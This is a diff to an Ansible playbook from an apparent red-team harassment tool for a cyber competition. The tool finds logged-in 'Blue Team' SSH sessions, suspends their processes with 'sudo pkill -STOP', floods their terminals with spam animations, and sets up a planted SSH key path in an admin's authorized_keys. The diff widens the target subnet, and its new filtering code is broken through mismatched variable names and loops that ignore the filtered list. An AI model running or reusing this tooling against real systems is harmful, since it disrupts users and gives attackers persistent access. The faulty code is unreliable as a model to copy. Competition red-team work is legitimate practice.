@@ -4,7 +4,7 @@
     become: yes
     vars:
     # Blue Team Subnet (Change)
-      subnet_prefix: "10.111.10.20"
+      subnet_prefix: "129."
     # Folder of Spam Animation Files on Control Machine
       source_spam_folder: "/root/Red_Team_PIF_Distraction_Tool/spamination/"
     # Hide Copy of Spam Folder in Downloads or other location in Target Machine
@@ -15,6 +15,14 @@
       redtool_ssh_key: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDr7RYMDKCraXtqxIZVrJw3A5I2A/toQG1yiJs4+UF2c root@bassbox"
     # Location of Target Machine Authourized Keys on Admin User
       remote_authorized_keys: "/home/mrkrabs/.ssh/authorized_keys"
+
+    vars_prompt:
+    # Script asks Red User for what animation file to display/send
+      - name: excluded_terminal
+        prompt: "Which terminals to exclude"
+        private: false
+        default: "pts/3"
+
   
     tasks:
 
@@ -24,21 +32,36 @@
         src: "{{ source_spam_folder }}"
         dest: "{{ remote_spam_folder }}"
 
-    - name: Search for Blue Team SSH Terminal Lines
+    - name: Search for SSH Terminal Lines 
     # Searches "who" output for terminal lines belonging to logged in Blue SSH Users
       ansible.builtin.shell: |
-        who | awk -v net="{{ subnet_prefix }}" '$0 ~ net {print $2}'
+        who | awk -v net="{{ subnet_prefix }}" '$0 ~ net && $1 != "kingneptune" && $1 != "paintythepirate" && $1 != "greyteamadmin" {print $2}'
     # Blue terminal lines saved in target_pts
       register: target_pts
       changed_when: false
 
-    - name: Stop Any Processes on Blues Terminal Line
+    - name: Convert Excluded Terminals into a List
+      ansible.builtin.set_fact:
+        excluded_terminal_list: >-
+          {{ excluded_terminals.split(',')
+             | map('trim')
+             | reject('equalto', '')
+             | list }}
+
+    - name: Filter Excluded Terminal Lines
+      ansible.builtin.set_fact:
+        target_pts_filtered: >-
+          {{ target_pts.stdout_lines
+             | reject('in', excluded_terminal_list)
+             | list }}
+
+    - name: Stop Any Processes on Filtered Terminal Line
     # Using target_pts, stop Blue users from using commands for a time
       ansible.builtin.shell: |
            (sudo pkill -STOP -t {{ item }} && sleep 20 && sudo pkill -CONT -t {{ item }}) &
     # Parenthesis and ampersand allow command to be background process
       loop: "{{ target_pts.stdout_lines }}"
-      when: target_pts.stdout_lines | length > 0
+      when: target_pts_filtered.stdout_lines | length > 0
       changed_when: false
     
     - name: Send Initial Animation
@@ -46,7 +69,7 @@
       ansible.builtin.shell: |
         /usr/bin/cat {{remote_spam_folder}}{{ remote_spam_file }} | tee /dev/{{ item }} > /dev/null
       loop: "{{ target_pts.stdout_lines }}"
-      when: target_pts.stdout_lines | length > 0
+      when: target_pts_filtered.stdout_lines | length > 0
       changed_when: false
 
 
